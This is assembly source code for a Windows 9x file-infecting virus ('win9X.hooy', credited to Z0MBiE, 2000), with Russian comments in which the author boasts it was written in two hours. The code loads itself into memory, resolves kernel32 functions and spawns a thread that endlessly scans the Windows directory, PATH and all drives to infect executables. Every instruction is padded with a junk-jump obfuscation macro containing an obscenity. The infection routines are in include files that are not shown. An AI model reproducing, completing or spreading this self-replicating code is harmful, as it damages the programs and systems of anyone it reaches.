
; ===========================================================================
; win9X.hooy ;-)                       (x) 2000 Z0MBiE, http://z0mbie.cjb.net

; simple pe infector.
; creates own thread from each infected program;
; this thread will scan hds and infect files.

; sample file CALC.EX$ processed first by UPX, then by CODEPERVERTOR.

; этот сорец предназначался для того, чтоб я посмотрел как будет работать
; созданная мной треада в чужом процессе.
; и вот, когда все стало понятно -- как-то получился вирус...
; ну а потом уже добавился один прикольный макрос... ;-)
; btw, весь продукт написан за 2 часа --
; так что использование готовых компонент себя оправдывает

; ===========================================================================

VIR_VA                  equ     66600000h

virsize                 equ     8192

include                 mz.inc
include                 pe.inc
include                 ex.inc

MEM_COMMIT              equ     00001000h
MEM_RESERVE             equ     00002000h
PAGE_EXECUTE_READWRITE  equ     00000040h


hooy                    macro   x
                        local   __j
                        jmp     __j
                        db      'хУй'
__j:                    endm

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

start:
                        jmp     init

include                 export.inc
include                 infect.inc
include                 fioexlow.inc
include                 recserch.inc

init:

        hooy
                        call    geteip                  ; need eip
geteip:

        hooy
                        pop     eax                     ; 'coz of packers
        hooy
                        sub     eax, geteip-start
        hooy

                        pusha
        hooy
                        xchg    ebp, eax        ; base
        hooy

                        call    export_getbase
        hooy

                        mov_h   edi, VirtualAlloc
        hooy
                        call    findfunc
        hooy
                        jz      __exit
        hooy

                        push    PAGE_EXECUTE_READWRITE
        hooy
                        push    MEM_RESERVE+MEM_COMMIT
        hooy
                        push    2000h+virmemory
        hooy
                        push    VIR_VA
        hooy
                        call    eax
        hooy

                        or      eax, eax
        hooy
                        jz      __exit
        hooy

        hooy
                        mov     esi, ebp
        hooy
                        mov     edi, offset start
        hooy
                        mov     ecx, virsize
        hooy
                        rep     movsb
        hooy

                        push    offset __newaddr
        hooy
                        ret
        hooy

__newaddr:              call    process_exports
        hooy

        hooy
                        push    ecx
        hooy
                        push    esp
        hooy
                        push    0
        hooy
                        push    0
        hooy
                        push    offset threadfunc
        hooy
                        push    1048576
        hooy
                        push    0
        hooy
                        call    xxCreateThread
        hooy
                        pop     ecx
        hooy
                        or      eax, eax
        hooy
                        jz      __exit

        hooy
                        nop
        hooy
                        nop
        hooy

__exit:
        hooy

                        popa

        hooy
                        db      05h     ; add eax, <dword>
old_eip                 dd      ?
        hooy
                        jmp     eax

        hooy
threadfunc:
        hooy
                        push    10*1000
        hooy
                        call    xxSleep
        hooy

        hooy
                        lea     edi, ff
        hooy
                        call    process_windir
        hooy
                        call    process_path
        hooy
                        call    process_drives
        hooy

                        jmp     threadfunc
        hooy

; input: EDX
        hooy

infect_handler:         pusha

        hooy
                        call    infect_file

        hooy
                        or      eax, eax
        hooy
                        jz      __exit
        hooy

                        push    3*1000
        hooy
                        call    xxSleep

        hooy
__exit:                 popa
        hooy
                        ret
        hooy

        hooy
export_getbase:         mov     ebx, 0BFF70000h         ; EBX=kernel base va
        hooy
                        mov     ecx, [ebx].mz_neptr     ; ECX=export va
        hooy
                        mov     ecx, [ecx+ebx].pe_exporttablerva
        hooy
                        add     ecx, ebx
        hooy
                        retn

m2                      macro   x
                        mov_h   edi, x
        hooy
                        call    findfunc
        hooy
                        jz      __error
        hooy
                        mov     xx&x, eax
        hooy
                        endm

process_exports:        pusha

        hooy
                        call    export_getbase

        hooy
                        m2      SetLastError
        hooy
                        m2      GetLastError
        hooy
                        m2      CreateFileA
        hooy
                        m2      CloseHandle
        hooy
                        m2      SetFilePointer
        hooy
                        m2      ReadFile
        hooy
                        m2      WriteFile
        hooy
                        m2      GetTickCount
        hooy
                        m2      GetWindowsDirectoryA
        hooy
                        m2      GetEnvironmentVariableA
        hooy
                        m2      GetDriveTypeA
        hooy
                        m2      FindFirstFileA
        hooy
                        m2      FindNextFileA
        hooy
                        m2      FindClose
        hooy
                        m2      CreateThread
        hooy
                        m2      Sleep
        hooy

                        clc
        hooy
__exit:                 popa
        hooy
                        ret
        hooy
__error:                stc
        hooy
                        jmp     __exit
        hooy

                        org     start+virsize

xxSetLastError          dd      ?
xxGetLastError          dd      ?
xxCreateFileA           dd      ?
xxCloseHandle           dd      ?
xxSetFilePointer        dd      ?
xxReadFile              dd      ?
xxWriteFile             dd      ?
xxGetTickCount          dd      ?
xxGetWindowsDirectoryA  dd      ?
xxGetEnvironmentVariableA dd    ?
xxGetDriveTypeA         dd      ?
xxFindFirstFileA        dd      ?
xxFindNextFileA         dd      ?
xxFindClose             dd      ?
xxCreateThread          dd      ?
xxSleep                 dd      ?

ff                      ff_struc ?

virmemory               equ     $-start

                        .code

loader:
                        call    process_exports

                        lea     edx, testfile
                        call    infect_file

                        ret

testfile                db      'calc.exe',0

                        end     loader
